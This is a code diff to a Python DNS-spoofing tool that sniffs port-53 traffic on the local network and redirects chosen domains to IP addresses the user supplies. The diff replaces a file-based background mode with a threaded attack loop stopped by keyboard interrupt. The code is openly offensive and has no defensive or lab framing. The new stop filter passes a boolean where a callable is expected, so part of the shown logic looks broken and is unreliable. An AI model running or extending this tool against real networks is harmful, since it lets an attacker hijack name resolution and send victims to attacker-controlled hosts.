@@ -10,12 +10,11 @@ import time
 import os
 
 interface = "udp port 53"
-BACKGROUND_SIGNAL_FILE = 'storage/background_signal.txt'
 
 # Global flag to indicate when to stop sniffing
-background_signal = threading.Event()
+stop_event = threading.Event()
 
-def spoof_dns_all(background):
+def spoof_dns_all():
     '''
     Main function to spoof all dns domains stored in domains.json
     '''
@@ -23,10 +22,10 @@ def spoof_dns_all(background):
     table = get_domains()
     click.echo("spoofing target using all stored domains")
 
-    attack(background, table)
+    start_attack(table)
 
 
-def spoof_dns_single(background):
+def spoof_dns_single():
     '''
     Main function to spoof domain entered by user
     '''
@@ -34,63 +33,25 @@ def spoof_dns_single(background):
     domain = click.prompt('Which domain do you want to spoof? Please enter the domain without www.')
     ip = click.prompt('Which IP should it route to?')
 
-    attack(background, {domain: ip})
+    start_attack({domain: ip})
 
 
-def attack(background, table):
-    '''
-    Function to differentiate between foreground and background attack
-    '''
-    if background:
-        return attack_background_start(table)
-    
-    attack_foreground(table)
+def start_attack(table):
+    # Start subthread running attack
+    attack_thread = threading.Thread(target=attack, args=(table,))
+    attack_thread.start()
 
+    try:
+        # Wait for keyboard interrupt
+        while True:
+            time.sleep(0.1)
+    except KeyboardInterrupt:
+        # Set stop_event when keyboard interrupt occurs
+        stop_event.set()
+        attack_thread.join()
 
-def attack_background_start(table):
-    if is_background_running():
-        click.echo('Attack is already running in the background. Stop this one first before starting another DNS attack.')
-        return
-    
-    click.echo('Starting attack in the background')
-
-    # Reset the stop event
-    set_background_signal(False)
-
-    # Create a new thread for the attack function
-    thread = threading.Thread(target=attack_background, daemon=True)
-    thread.start()
-
-
-def attack_background_stop():
-    # Set the stop event to stop sniffing
-    set_background_signal(True)
-    time.sleep(1)
-    os.remove(BACKGROUND_SIGNAL_FILE)
-
-
-def attack_foreground(table):
-    while True:
-        try:
-            # TODO: add multi-threading solution
-            sniff(filter=interface, prn=lambda pkt: analyze_packet(pkt, table), count=30)
-        except KeyboardInterrupt:
-            break
-
-    click.echo("Stopped attacking")
-
-
-def attack_background():
-    # real function
-    # sniff(filter=interface, prn=lambda pkt: analyze_packet(pkt, table), stop_filter=background_signal.is_set())
-
-    #test function
-    with open('temp.txt', 'w') as file:
-        while not is_background_signal_set():
-            print("running")
-            file.write('running\n')
-            file.flush()  # Flush the file buffer to ensure the data is written immediately
-            time.sleep(1)
+def attack(table):
+    sniff(filter=interface, prn=lambda pkt: analyze_packet(pkt, table), stop_filter=stop_event.is_set())
 
 
 def analyze_packet(packet, table):
@@ -145,20 +106,3 @@ def get_packet_query_name(dns_packet):
         name = name[4:]
 
     return name
-
-def set_background_signal(value):
-    with open(BACKGROUND_SIGNAL_FILE, 'w') as file:
-        file.write(str(value))
-
-
-def is_background_signal_set():
-    if not os.path.exists(BACKGROUND_SIGNAL_FILE):
-        return False
-
-    with open(BACKGROUND_SIGNAL_FILE, 'r') as file:
-        value = file.read().strip()
-        return value.lower() == 'true'
-
-
-def is_background_running():
-    return os.path.exists(BACKGROUND_SIGNAL_FILE)
